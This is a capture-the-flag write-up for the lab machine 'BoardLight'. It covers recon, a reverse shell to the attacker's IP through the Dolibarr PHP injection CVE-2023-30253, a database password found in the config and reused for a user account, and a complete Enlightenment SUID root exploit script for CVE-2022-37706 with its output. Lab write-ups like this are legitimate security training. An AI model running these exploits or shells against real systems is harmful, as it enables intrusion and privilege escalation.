@@ -1,0 +1,329 @@
+# BoardLight Write-Up
+
+Target: 10.10.11.11
+
+---
+
+## Introduction
+- Objective: Successfully retrieve the user and root flag from the easy Linux box 'BoardLight', I will not use other's write ups unless I believe I have exhausted all of my options.
+- Tools: nmap, ffuf, Wappalyzer, Metasploit, mysql, hashcat, LinEnum, searchsploit 
+
+---
+
+## Initial Reconnaissance
+	- Port Scanning: Scanning all ports using nmap, -sC for default scripts, -sV for version, --min-rate=1000 for 1000 packets per second, -T4 for reducing dynamic scan delay to max 10ms
+		- Command: nmap -p- -sC -sV --min-rate=1000 -T4 10.10.11.11
+		- Output:   Not shown: 65533 closed tcp ports (conn-refused)
+					PORT   STATE SERVICE VERSION
+					22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+					| ssh-hostkey: 
+					|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
+					|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
+					|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
+					80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+					|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+					|_http-server-header: Apache/2.4.41 (Ubuntu)
+					Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+	- Observations: There is an Apache web server being hosted on port 80 and a SSH server being hosted on port 22.
+
+---
+
+## Enumeration
+	- Service Exploration:
+		- Service 1: FFUF Directory Enumeration
+			- Command: 
+			ffuf -u http://10.10.11.11/FUZZ -w /opt/useful/SecLists/Discovery/Web-Content/raft-medium-directories.txt
+			- Output:
+					images                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 56ms]
+					css                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 56ms]
+					js                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 83ms]
+					server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 68ms]
+
+		- Service 2: FFUF Sub-Domain Enumeration, -fs to filter out the file size 15949
+			- Command:
+			ffuf -u http://10.10.11.11/ -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.board.htb" -fs 15949
+			- Output:
+					crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 85ms]
+					
+	- Manual Checks: 
+		The website is a page for their business. 
+		crm.board.htb is a login page for Dolibarr - admin/admin give you access to the dashboard even though it says:
+			Access denied.
+			You try to access to a page, area or feature of a disabled module or without being in an authenticated session or that is not allowed to your user.
+		Metasploit has a few dolibarr exploits
+			
+		
+	- Key Findings: 
+		Wappalyzer
+			Programming Language - PHP
+			CDN - Cloudflare, cdnjs
+			Javascript Libraries - OWL Carousel, jQuery 3.4.1
+			UI Framework - Bootstrap 4.3.1
+		Domain Name: Board.htb - added to /etc/hosts - able to search for sub domains now
+		Sub Domain crm.board.htb - added to /etc/hosts
+		Dolibarr login is admin/admin
+		Cookies are saved inside of the browser 
+			Name													Value
+			DOLSESSID_3dfbb778014aaf8a61e81abec91717e6f6438f92		bek1h2n1lgn74jkh169fl1f6cu
+		I have the ability to create an email template
+			Within there is a list of available substitution variables
+		Dolibarr 17.0.0
+			CVE-2023-30253
+---
+
+## Exploitation: CVE-2023-30253 
+	Summary: CVE-2023-30253 allows for RCE by php injection. If php code is disabled <?php code..?> you are able to bypass this by <?PHP code..?>. In fact the check upon the tag "<?php" can be bypasses by typing it with any character in uppercase (Php, pHp, pHP, PHP). In conclusion, with a low privileged user who has access to the websites plug and without the php code permission, it's posssible to execute command on the remote machine, and in this box I have the admin account. After looking up the CVE online I came across a POC from nikn0laty: https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253.git
+	- Initial Access: using the POC with the admin/admin logins, sending a reverse shell request via PHP RCE
+		- Command: python3 exploit.py http://crm.board.htb admin admin 10.10.16.3 4444
+		- Output: 
+				[*] Trying authentication...
+				[**] Login: admin
+				[**] Password: admin
+				[*] Trying created site...
+				[*] Trying created page...
+				[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection  
+				www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$
+	- Shell Access: Taking my restricted shell and making it a partially interactive bash shell using python trick via: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-3-upgrading-from-netcat-with-magic
+		- Command:  # In reverse shell
+					$ python3 -c 'import pty; pty.spawn("/bin/sh")'
+					Ctrl-Z
+
+					# In ParrotOS
+					$ stty raw -echo
+					$ fg
+
+					# In reverse shell
+					$ xterm
+					$ export TERM=xterm
+					$ stty rows 24 cols 80
+					$ reset
+		- Output:  www-data@boardlight:/$ 
+		
+		*Note* I still dont have enough permissions to view the user flag in Larissa's home. So I need to find a way to get her login info.*Note*
+		
+	Logging into Larissa's Account: Have to find database information that crm.board.htb uses.
+		- Command: more /var/www/html/crm.board.htb/htdocs/conf/conf.php
+		- Output: 
+				$dolibarr_main_url_root='http://crm.board.htb';
+				$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
+				$dolibarr_main_url_root_alt='/custom';
+				$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
+				$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
+				$dolibarr_main_db_host='localhost';
+				$dolibarr_main_db_port='3306';
+				$dolibarr_main_db_name='dolibarr';
+				$dolibarr_main_db_prefix='llx_';
+				$dolibarr_main_db_user='dolibarrowner';
+				$dolibarr_main_db_pass='serverfun2$2023!!';
+				$dolibarr_main_db_type='mysqli';
+				$dolibarr_main_db_character_set='utf8';
+				$dolibarr_main_db_collation='utf8_unicode_ci';
+				// Authentication settings
+				$dolibarr_main_authentication='dolibarr';
+				
+		- Command: mysql -u dolibarrowner -p
+				Enter password: serverfun2$2023!!          
+		- Output: Welcome to the MySQL monitor.
+				  mysql>
+		
+		- Command: use dolibarr
+					mysql> SELECT rowid, login, pass_crypted, email FROM llx_user;
+		- Output:
+				+-------+----------+--------------------------------------------------------------+-------+
+				| rowid | login    | pass_crypted                                                 | email |
+				+-------+----------+--------------------------------------------------------------+-------+
+				|     1 | dolibarr | $2y$10$VevoimSke5Cd1/nX1Ql9Su6RstkTRe7UX1Or.cm8bZo56NjCMJzCm |       |
+				|     2 | admin    | $2y$10$gIEKOl7VZnr5KLbBDzGbL.YuJxwz5Sdl5ji3SEuiUSlULgAhhjH96 |       |
+				+-------+----------+--------------------------------------------------------------+-------+
+
+		
+		- Command: ─[mrincognito@parrot]─[~/Desktop/LABS/board]
+					└──╼ $nano board.hash
+					$2y$10$VevoimSke5Cd1/nX1Ql9Su6RstkTRe7UX1Or.cm8bZo56NjCMJzCm
+					$2y$10$gIEKOl7VZnr5KLbBDzGbL.YuJxwz5Sdl5ji3SEuiUSlULgAhhjH96
+				
+					hashcat --identify board.hash		
+		- Output: The following 4 hash-modes match the structure of your input hash:
+
+					  # | Name                                                       | Category
+				  ======+============================================================+======================================
+				   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
+				  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
+				  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
+				  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce
+		
+		*Turns out it was simply just password reuse with larissa's account, tried it while hashcat was going*
+
+## User Flag
+		- Command: su larissa
+					Password: serverfun2$2023!!
+					cat ~/user.txt
+		- Output: e1774fa13a2e045e09c2c3bf228a4c71
+
+---
+
+## Privilege Escalation
+	- Step 1: Information Gathering:
+	- System Info: Kernel and OS-Release
+		- Command: cat /etc/os-release
+		- Output:   NAME="Ubuntu"
+					VERSION="20.04.6 LTS (Focal Fossa)"
+					ID=ubuntu
+					ID_LIKE=debian
+					PRETTY_NAME="Ubuntu 20.04.6 LTS"
+					VERSION_ID="20.04"
+					
+		- Command: uname -a
+		- Output: Linux boardlight 5.15.0-107-generic #117~20.04.1-Ubuntu SMP Tue Apr 30 10:35:57 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
+		
+	- User Context:
+		- Command: id 
+		- Output: uid=1000(larissa) gid=1000(larissa) groups=1000(larissa),4(adm)
+		
+	- Automated Tools:
+		- Command: wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh && chmod +x /tmp/LinEnum.sh && /tmp/LinEnum.sh
+		- Output:
+				-rwsr-xr-x 1 root root 26944 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
+				-rwsr-xr-x 1 root root 14648 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
+				-rwsr-xr-x 1 root root 14648 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
+				-rwsr-xr-x 1 root root 14648 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
+		
+- Step 2: Identify Vectors:
+	- SUID Binaries:
+		- Command: find / -perm -u=s -type f 2>/dev/null
+		- Output: *Same as LinEnum.sh*
+		
+	- Cron Jobs:
+		- Command: crontab -l && ls -la /etc/cron.* /var/spool/cron/
+		- Output: no crontab for larissa
+		
+	- Kernel Exploits:
+		- Command: searchsploit linux kernel 5.15
+		- Output: Linux Kernel 5.8 < 5.16.11 - Local Privilege Escalation (DirtyPipe)| linux/local/50808.c
+		
+	- Misconfigurations:
+		- Command: sudo -l
+		- Output: Sorry, user larissa may not run sudo on localhost.
+		
+		- Command: find /etc -writable 2>/dev/null
+		- Output: 
+				/etc/systemd/system/cups.socket
+				/etc/systemd/system/nginx.service
+				/etc/systemd/system/ModemManager
+				/etc/systemd/system/cups.service
+				/etc/systemd/system/switcheroo-control.service
+				/etc/systemd/system/openvpn.service
+				/etc/systemd/system/systemd-networkd-wait-online.service
+				/etc/systemd/system/cups-browsed.service
+				/etc/systemd/system/networkd-dispatcher.service
+				/etc/systemd/system/systemd-networkd.service
+				/etc/systemd/system/cups.path
+				/etc/systemd/system/systemd-networkd.socket
+				/etc/systemd/user/tracker-miner-fs.service
+				/etc/systemd/user/rygel.service
+		
+		- Command: env
+		- Output: -
+		
+		- Command: ls -la /etc/httpd/conf
+		- Output: No such file or directory
+		
+		- Command: systemctl list-units --type=service
+		- Output: -
+		
+		- Command: cat /var/log/auth.log 2>/dev/null
+		- Output: -
+			
+	- Step 3: Exploit the Vector: CVE-2022-37706 Enlightenment LPE
+		- Command: enlightenment --version
+		- Output: Version: 0.23.1
+		
+		- Command: nano exploit.sh
+					#!/bin/bash
+
+					echo "CVE-2022-37706"
+					echo "[*] Trying to find the vulnerable SUID file..."
+					echo "[*] This may take few seconds..."
+
+					file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
+					if [[ -z ${file} ]]
+					then
+						echo "[-] Couldn't find the vulnerable SUID file..."
+						echo "[*] Enlightenment should be installed on your system."
+						exit 1
+					fi
+
+					echo "[+] Vulnerable SUID binary found!"
+					echo "[+] Trying to pop a root shell!"
+					mkdir -p /tmp/net
+					mkdir -p "/dev/../tmp/;/tmp/exploit"
+
+					echo "/bin/sh" > /tmp/exploit
+					chmod a+x /tmp/exploit
+					echo "[+] Enjoy the root shell :)"
+					${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
+					
+		- Command:  chmod +x exploit.sh
+					./exploit.sh
+		- Output: CVE-2022-37706
+				[*] Trying to find the vulnerable SUID file...
+				[*] This may take few seconds...
+				[+] Vulnerable SUID binary found!
+				[+] Trying to pop a root shell!
+				[+] Enjoy the root shell :)
+
+	- Step 4: Verify Access:
+		- Command: id
+		- Output: uid=0(root) gid=0(root) groups=0(root),4(adm),1000(larissa)
+
+---
+
+## Post-Exploitation
+	- Flag Retrieval: /root
+		- Command: cat root.txt
+		- Output: 77b7dfe980361b0201b1ff8c2e644571
+	- Persistence (Optional):
+	- Evidence:
+
+---
+
+## Conclusion
+- Summary: On boardlight (10.10.11.11), I used nmap to identify Apache (port 80) and SSH (port 22). ffuf uncovered crm.board.htb running Dolibarr 17.0.0. Exploiting CVE-2023-30253 with admin/admin, I gained a www-data shell via PHP RCE. I accessed Dolibarr’s database, cracked larissa’s password (serverfun2$2023!!), and retrieved the user flag (e1774fa...). For root, LinEnum identified Enlightenment SUID binaries (version 0.23.1). I exploited CVE-2022-37706, a command injection vulnerability in enlightenment_sys. Maher Azzouzi’s GitHub analysis revealed that enlightenment_sys improperly handles /bin/mount -o parameters, allowing code execution by crafting malicious paths to bypass security checks [Web ID: 0]. This spawned a root shell, yielding the root flag (77b7dfe...).
+
+- Lessons Learned:
+	Thorough Enumeration is Key: Using nmap and ffuf to identify services (Apache, Dolibarr) and subdomains (crm.board.htb) was critical for finding initial access points.
+
+	Check for Duplicate Passwords: Discovering larissa reused the Dolibarr database password (serverfun2$2023!!) highlighted the importance of checking for password reuse between users to simplify privilege escalation.
+
+	Shell Stabilization Techniques: Using python3 -c 'import pty; pty.spawn("/bin/sh")' improved my reverse shell’s interactivity, and stty rows 24 cols 80 adjusted the terminal to prevent overlapping lines, enhancing usability.
+
+	Exploit SUID Binaries: Leveraging LinEnum to find Enlightenment SUID binaries (CVE-2022-37706) showed the value of targeting misconfigured SUID files for root access.
+
+	Database Enumeration Pays Off: Extracting credentials from Dolibarr’s database via MySQL underscored the need to explore application data for escalation clues.
+
+- Fixes:
+	Patch Dolibarr Vulnerability (CVE-2023-30253): Upgrade Dolibarr to version 17.0.1 or later to fix the PHP RCE flaw that allowed bypassing the <?php tag check with uppercase variations (e.g., <?PHP).
+
+	Secure Database Credentials: Change the default MySQL password (serverfun2$2023!!) to a strong, unique one. Store it securely (e.g., in a vault), not in plaintext in /var/www/html/crm.board.htb/htdocs/conf/conf.php.
+
+	Enforce Password Policies: Prevent password reuse across accounts (e.g., larissa reusing the database password). Implement a policy requiring unique, complex passwords for each user.
+
+	Fix Enlightenment SUID Flaw (CVE-2022-37706): Update Enlightenment to version 0.25.4 or later to address the command injection in enlightenment_sys via /bin/mount -o parameters.
+
+	Remove Unnecessary SUID Binaries: Remove or restrict SUID permissions on Enlightenment binaries (e.g., /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys) to prevent privilege escalation.
+	---
+
+## Appendix
+- Additional Details:
+  - System Info: Ubuntu 20.04.6 LTS (Focal Fossa) with kernel 5.15.0-107-generic.
+  - Dolibarr Version: 17.0.0, vulnerable to CVE-2023-30253.
+  - Enlightenment Version: 0.23.1, vulnerable to CVE-2022-37706.
+  - User Progression: Initial access as `www-data` via Dolibarr exploit, escalated to `larissa` using database credentials, and finally to `root` via Enlightenment SUID exploit.
+  
+- Tools and Exploits:
+  - nmap: Used for port scanning and service enumeration (`nmap -p- -sC -sV --min-rate=1000 -T4 10.10.11.11`).
+  - ffuf: Performed directory and subdomain enumeration (`ffuf -u http://10.10.11.11/ -w ... -H "Host: FUZZ.board.htb" -fs 15949`).
+  - LinEnum: Automated enumeration script for privilege escalation (`wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`).
+  - CVE-2023-30253 Exploit: PHP RCE in Dolibarr (PoC: `https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253.git`).
+  - CVE-2022-37706 Exploit: Enlightenment SUID command injection (PoC: `https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit`).
